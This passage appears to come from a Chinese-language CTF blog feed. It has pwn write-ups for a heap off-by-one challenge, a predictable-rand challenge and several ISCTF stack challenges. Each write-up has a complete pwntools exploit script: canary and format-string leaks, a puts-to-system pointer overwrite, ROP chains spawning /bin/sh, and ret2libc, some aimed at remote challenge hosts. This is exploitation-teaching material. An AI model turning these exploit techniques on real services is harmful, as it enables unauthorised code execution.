class="built_in">puts</span>(<span class="string">&quot;Malloc Error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v0 = heaplist[v3];</span><br><span class="line">    *(_QWORD *)(v0 + <span class="number">16</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line">    *(_QWORD *)(heaplist[v3] + <span class="number">32LL</span>) = &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_QWORD *)(heaplist[v3] + <span class="number">16LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Malloc Error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sizelist[v3] = size;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Name: &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)read(<span class="number">0</span>, (<span class="type">void</span> *)heaplist[v3], <span class="number">0x10u</span>LL) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Something error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)read(<span class="number">0</span>, *(<span class="type">void</span> **)(heaplist[v3] + <span class="number">16LL</span>), sizelist[v3]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">    v1 = heaplist[v3];</span><br><span class="line">    *(_DWORD *)(v1 + <span class="number">24</span>) = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出add()也是建立了两个chunk。一个0x20的struct chunk(sc)，另一个是我们控制大小的content chunk</p>
<p>(cc)。然后在sc里放了puts的真实地址。（由于延迟链接的问题，所以在前面调用了puts的情况下，这里就会直接变成puts的真实地址，而不是got表地址，所以接收到就可以了。）所以我们可以泄露出，然后就获得libc的基地址。后面又会在cc里读入我们输入的内容。</p>
<p><img src="/images/heap3.png" alt="gdb"></p>
<p>可以看的出来，<code>0x55555555b020</code>处存着指向我们写入数据的指针，而下面也放着puts的地址。通过show()函数，我们可以知道，当我们调用show函数的时候，我们写入的数据会编程puts的参数，然后输出。所以如果我们劫持puts函数为system函数，再把我们写入的&#x2F;bin&#x2F;sh当作参数，就可以getshell了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n0x10; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your idx:&quot;</span>);</span><br><span class="line">  n0x10 = getnum();</span><br><span class="line">  <span class="keyword">if</span> ( n0x10 &lt; <span class="number">0x10</span> &amp;&amp; heaplist[n0x10] )</span><br><span class="line">  &#123;</span><br><span class="line">    (*(<span class="type">void</span> (__fastcall **)(_QWORD))(heaplist[n0x10] + <span class="number">32LL</span>))(heaplist[n0x10]);</span><br><span class="line">    <span class="keyword">return</span> (*(__int64 (__fastcall **)(_QWORD))(heaplist[n0x10] + <span class="number">32LL</span>))(*(_QWORD *)(heaplist[n0x10] + <span class="number">16LL</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error idx!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那我们该怎么利用呢？这里就要用到edit函数了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n0x10; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your idx:&quot;</span>);</span><br><span class="line">  n0x10 = getnum();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">  nbytes = getnum();</span><br><span class="line">  <span class="keyword">if</span> ( n0x10 &lt;= <span class="number">0x10</span> &amp;&amp; heaplist[n0x10] &amp;&amp; nbytes &lt;= <span class="number">0x100</span> )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, *(<span class="type">void</span> **)(heaplist[n0x10] + <span class="number">16LL</span>), nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Error idx!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>edit函数做的事情是，把指定下标的堆块的大小进行改变，前提是不大于0x100。这里就存在漏洞了。如果我们申请两个的堆块。由于堆块是连起来的，所以我们可以对idx&#x3D;0的堆块的大小进行改变，将0cc变大，然后就可以在0cc输入数据的时候覆盖idx&#x3D;1的堆块的数据。最后再调用1堆块就可以实现改写puts–&gt;system。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;node5.anna.nssctf.cn&#x27;,29080)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,name,content</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;: &#x27;</span>,name)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x31</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + <span class="string">b&#x27;\x80&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x31</span>,pl1)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - libc.sym.puts</span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line">sys = base + libc.sym.system</span><br><span class="line"><span class="comment">#binsh = base + next(libc.search(&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x31</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(sys)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x48</span>,pl2)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>可以看出来我们这里对edit去改变堆块的大小是有讲究的，第一次为什么大小修改为0x31，这里的b’\x80’又是什么呢？</p>
<p>其实可以看出来，第一次是为了泄露出puts的地址，而这里的0x80则是off-by-one的做法。覆盖最低位的那个字节。是idx&#x3D;1的指向内容的指针指向了puts的地址，那么下次puts的内容就是puts的地址了。</p>
<p><img src="/images/heap4.png" alt="gdb"></p>
<p>可以看出1的指向cc的指针变成了指向puts的地址，同时由于我们0cc的输入地址是在<code>0x55555555b040</code>,而需要修改的位置是在<code>0x55555555b070</code>所以刚好是0x30+b’\x80’&#x3D;0x31的大小。后面的第二次的修改就和第一次的修改原理是一样了。关键是需要通过gdb逐步调试跟进。</p>
]]></content>
      <categories>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn进阶</tag>
      </tags>
  </entry>
  <entry>
    <title>random</title>
    <url>/2025/12/16/random/</url>
    <content><![CDATA[<h1 id="random"><a href="#random" class="headerlink" title="random"></a>random</h1><p>之前一直遇到随机数的题目，一直没有尝试，现在来记录一下新的一种解题方法，顺便加强一下Python能力。😁</p>
<p><img src="/images/random1.png" alt="ida"></p>
<p>可以看出来，这里基本上都是随机数，但是其实是伪随机，所以我们可以通过得到种子的值，来获得程序中的随机数。这里最主要的其实就是脚本的编写。</p>
<p>由于我们脚本是由python来写的，而程序使用C语言。所以这里引用ctypes库。</p>
<p><strong>ctypes</strong> 是 Python 的一个外部函数库，用于调用 C 语言的动态链接库（DLL）或共享库。它提供了与 C 语言兼容的数据类型，并允许在 Python 中直接调用 C 函数。</p>
<p>通过分析程序可以看出，我们只要满足v7&#x3D;&#x3D;v8就可以获得shell。那么我们来看怎么得到v8的随机数呢？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">seed = time(<span class="number">0LL</span>);</span><br><span class="line">srand(seed[<span class="number">0</span>]);</span><br><span class="line">v3 = rand();</span><br><span class="line">v4 = rand() ^ v3;</span><br><span class="line">v5 = rand();</span><br><span class="line">srand(v4 ^ v5);</span><br><span class="line">rand();</span><br><span class="line">rand();</span><br><span class="line">rand();</span><br><span class="line">v8 = rand();</span><br></pre></td></tr></table></figure>

<p>可以看出，这里的种子是time(NULL)，得到两个随机数后，又重新设置了种子。也就是说只要我们求出新的种子，再求出第四个随机数就可以得到v8了。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">27416</span>)</span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;username: &#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1f</span>+<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;password: &#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;ls_4nyth1n9_7ruIy_R4nd0m?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;ab&#x27;</span>)</span><br><span class="line">seed = u64(io.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(seed)</span><br><span class="line"></span><br><span class="line">libc.srand(seed)</span><br><span class="line">v3 = libc.rand()</span><br><span class="line">v4 = libc.rand() ^ v3</span><br><span class="line">v5 = libc.rand()</span><br><span class="line">libc.srand(v4 ^ v5)</span><br><span class="line">libc.rand()</span><br><span class="line">libc.rand()</span><br><span class="line">libc.rand()</span><br><span class="line">v7 = libc.rand()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;now.\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(v7))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这边解释一下exp。这里的s和seed[2]是紧挨着的，而read读取的最大长度刚好是0x20，也就是s所有的字节大小。那么当我读入0x20padding时，下面的printf便会输出，直到遇到\x00，也就是说，会读出seed[0]，也就是我们需要的第一个种子，也就可以得到接下来的种子了。</p>
<p>ctypes.CDLL是加载动态链接库，也就是可以用来调用C语言。</p>
]]></content>
      <categories>
        <category>stack</category>
      </categories>
      <tags>
        <tag>pwn入门</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCTF-Stack</title>
    <url>/2025/12/11/ISCTF-Stack/</url>
    <content><![CDATA[<h1 id="ISCTF"><a href="#ISCTF" class="headerlink" title="ISCTF"></a>ISCTF</h1><h2 id="1-Sign"><a href="#1-Sign" class="headerlink" title="1.Sign"></a>1.Sign</h2><p><img src="/images/is1-1.png" alt="ida"></p>
<p>看ida里，可以看出buf是一维数组。类型为dword，4字节。所以索引值为27的</p>
<p>时候，实际上是第28个元素。所以我们只需要控制覆。盖buf的第28个元素为-1378178390就可以getshell了。那么padding就是27*4&#x3D;108。由于这里是有符号数转16进制，所以上网站转换一下就行。</p>
<p><img src="/images/is1-2.png"></p>
<p>目标数的16进制是0xaddaaaaa。同时由于这里是dword，4字节，所以用p32包裹0xaddaaaaa就可以getshell了。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;challenge.bluesharkinfo.com&#x27;</span>,<span class="number">25138</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span> * <span class="number">108</span> + p32(<span class="number">0xaddaaaaa</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;do you like blueshark?&#x27;</span>,pl)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="2-Fmt"><a href="#2-Fmt" class="headerlink" title="2.Fmt"></a>2.Fmt</h2><p><img src="/images/is2-1.png" alt="ida"></p>
<p>经典的格式化字符串泄露。但是这里需要换一下附件的依赖。</p>
<p>由于这里给了libc.so.6，所以我们可以通过strings libc.so.6 | grep “ubuntu”来获得版本。</p>
<p>例如输出：GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.10) stable release version 2.35.</p>
<p>所以可以在glibc-all-in-one 去寻找2.35-0ununtu3的版本来下载动态链接器（一般保持大版本相同就行）。</p>
<p>patchelf –replace-needed (原版本)libc.so.6 (替换的版本).&#x2F;libc.so.6 (文件名).&#x2F;pwn</p>
<p>patchelf –set-interpreter ld-linux-x86-64.so.2(替换的版本) .&#x2F;pwn</p>
<p>如果能成功运行程序，那么基本就可以了。像检查的话，可以由ldd pwn来查看附件的以来情况。</p>
<p>回到这道题，第一步还是测试数据。可以得到offset&#x3D;6，那么canary的位置就是6 +（0x90-0x8）&#x2F;8 &#x3D; 23。</p>
<p><img src="/images/is2-2.png" alt="gdb"></p>
<p>可以看出canary距离为2的地方存放了main的地址，那么减去main函数在ida里的地址（pie保护），再减去偏移量，就可以得到程序的基址了。（也可以看main函数中mov eax，0的位置的地址是多少。）</p>
<p>同时程序win函数中存放了shell，所以后面用ret2text的做法就可以getshell了。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./ez_fmt&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;challenge.bluesharkinfo.com&#x27;</span>,<span class="number">20932</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ez_fmt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl1 = <span class="string">b&#x27;%23$paa%25$p&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;1st input: &#x27;</span>,pl1)</span><br><span class="line"><span class="comment">#canary = u64(io.recvuntil(b&#x27;\x7f&#x27;)[:-6].rjust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(canary))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">pro_base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">97</span> - <span class="number">0x12fa</span></span><br><span class="line">success(<span class="built_in">hex</span>(pro_base))</span><br><span class="line">backdoor = elf.symbols[<span class="string">&#x27;win&#x27;</span>] + pro_base</span><br><span class="line">success(<span class="built_in">hex</span>(backdoor))</span><br><span class="line">ret = <span class="number">0x12f9</span> + pro_base</span><br><span class="line"></span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x90</span>-<span class="number">0x8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(ret) + p64(backdoor)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;2nd input: &#x27;</span>,pl2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="3-EZ2048"><a href="#3-EZ2048" class="headerlink" title="3.EZ2048"></a>3.EZ2048</h2><p>一道非常有意思的题目🤔。</p>
<p><img src="/images/is3-1.png" alt="main"></p>
<p>具体的代码不完全展示了。基本逻辑就是通过2048来获取分数，满足100000分后可以进入shell函数。这里的漏洞点在整型溢出。由于有有符号数转无符号数的代码，所以当有符号数为-1等数的时候，转为无符号数是极大值。由于这里一开始给我们50分，结束一局扣10分。所以可以通过连续推出6局来使分数达到-10转成一个大于100000的分数，从而成功进入shell函数。</p>
<p><img src="/images/is3-2.png" alt="shell"></p>
<p>可以看到这里的shell函数只会执行一个ls的命令，还有一个exit的命令。同时还存在canary。所以第一个想法是先泄露canary。canary在buf[17]的位置上，也就是前面有17个元素。qword是8字节，所以padding&#x3D;17*8&#x3D;136。由于printf截断\x00输出的缘故，所以再填充一个junk，将canary顺势输出。</p>
<p>再结合前面main函数，让你输入名字的地方，发现buf的位置正好是bss段。所以可以写入&#x2F;bin&#x2F;sh，最后再回到地址0x404a40来实现getshell。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./ez2048&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;challenge.bluesharkinfo.com&#x27;</span>,<span class="number">23145</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ez2048&#x27;</span>)</span><br><span class="line">bss = <span class="number">0x404a46</span></span><br><span class="line">sys = <span class="number">0x401170</span></span><br><span class="line">ret = <span class="number">0x4027ea</span></span><br><span class="line">rdi = <span class="number">0x40133e</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;game&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;your score:&#x27;</span>)</span><br><span class="line">    score = <span class="built_in">int</span>(io.recvline()[:-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> score&lt;<span class="number">0</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">        io.send(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">        io.send(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    io.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;$ &#x27;</span>) </span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">136</span> + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">io.send(pl1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;ab&#x27;</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line">success(<span class="string">f&#x27;canary:&#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x90</span>-<span class="number">0x8</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(ret) + p64(rdi) + p64(bss) + p64(sys) </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;$ &#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">pause()</span><br><span class="line">io.send(<span class="string">b&#x27;exit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这里解释一下exp。</p>
<p>bss地址为什么要偏移6。</p>
<p>可以看一下源代码。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(dest, <span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(dest, buf);</span><br><span class="line"><span class="built_in">strcpy</span>(buf, dest);</span><br></pre></td></tr></table></figure>

<p>所以可以看出来，hello和我们输入的内容拼接在一起，并且写到了bss段上。（可以通过gdb动调看出。）</p>
<p>最后为什么要发送exit。</p>
<p>因为我们构造的执行流是需要到shell函数的结束的时候才会执行。而这里存在两个死循环，所以我们需要主动打破最外层的循环来使程序执行我们构造的恶意代码。</p>
<h2 id="4-Ret2rop"><a href="#4-Ret2rop" class="headerlink" title="4.Ret2rop"></a>4.Ret2rop</h2><p>这道题为我们展示了ret2text的做法，也很有意思。</p>
<p><img src="/images/is4-1.png" alt="ida"></p>
<p>这是vuln函数的伪代码，可以看出，这里还是有一个需要你输入姓名的代码。那么结合一下上面一道题，我们可以看出来还是需要往name（bss段）内填入&#x2F;bin&#x2F;sh。</p>
<p>这里需要注意的点。</p>
<p><img src="/images/is4-2.png" alt="frame"></p>
<p>1.frame是一个结构体，里面的成员有buf和mask。可以把buf和mask理解为数组，各自含有32个元素。</p>
<p>2.观察vuln函数发现，这里有一个xor异或保护。可以知道一个数与0异或，其值不变。所以我们可以在我们构造的rop链的后面填入大量的\x00来保证我们的rop链成功执行。</p>
<p>可以看出是buf[i]^mask[i]，并且把最后的结果写入到buf[i]中。所以两者之间的offset&#x3D;0x20。</p>
<p><img src="/images/is4-3.png" alt="stack"></p>
<p>可以根据图来看栈上的基本结构。所以这里的rop会与0x20个0进行异或。由于要保证这里的0x20为0，所以往后多填充了一些0，来使0x20处的0值不变。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./ret2rop&#x27;</span>)</span><br><span class="line">pop_rsi = <span class="number">0x401a1c</span></span><br><span class="line">mov_rdi_rsi = <span class="number">0x401a25</span></span><br><span class="line">ret = <span class="number">0x4015b0</span></span><br><span class="line">bss = <span class="number">0x4040f0</span></span><br><span class="line">sys = <span class="number">0x401180</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;demo&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">pl = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x58</span> + p64(pop_rsi) + p64(bss) + p64(mov_rdi_rsi) + p64(sys) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x50</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;yourself&#x27;</span>) </span><br><span class="line">io.send(pl)</span><br><span class="line">                                                                        </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="5-Canary"><a href="#5-Canary" class="headerlink" title="5.Canary"></a>5.Canary</h2><p><img src="/images/is5-1.png" alt="vuln"></p>
<p><img src="/images/is5-2.png" alt="checksec"></p>
<p>可以看出这里开了canary保护，所以我们要写泄露出canary。vuln函数可以看出 ，给了很多溢出的空间。所以可以填充canary的最高位字节，就可以把canary泄露出来了。然后后面就可以按照ret2libc去做了。不过这里没有pop rdi，那我们又该怎么泄露libc_base呢？</p>
<p>进gdb调试，可以看见，当我们运行到vuln函数ret前，可以看到rdi的地址内存放着funlockfile的地址。那此时调用 puts_plt就可以把rdi存放的内容打印出来了 。</p>
<p><img src="/images/is5-3.png" alt="gdb"></p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">vuln = elf.sym.vuln</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span> *  <span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name &gt;&gt;&#x27;</span>)</span><br><span class="line">io.send(pl1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;ab&#x27;</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">f&#x27;canary:&#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x110</span>-<span class="number">0x8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(elf.plt.puts) + p64(vuln)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;content &gt;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl2)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - libc.sym.funlockfile</span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sys = base + libc.sym.system</span><br><span class="line">binsh = base + <span class="built_in">next</span>(libc.search(<span 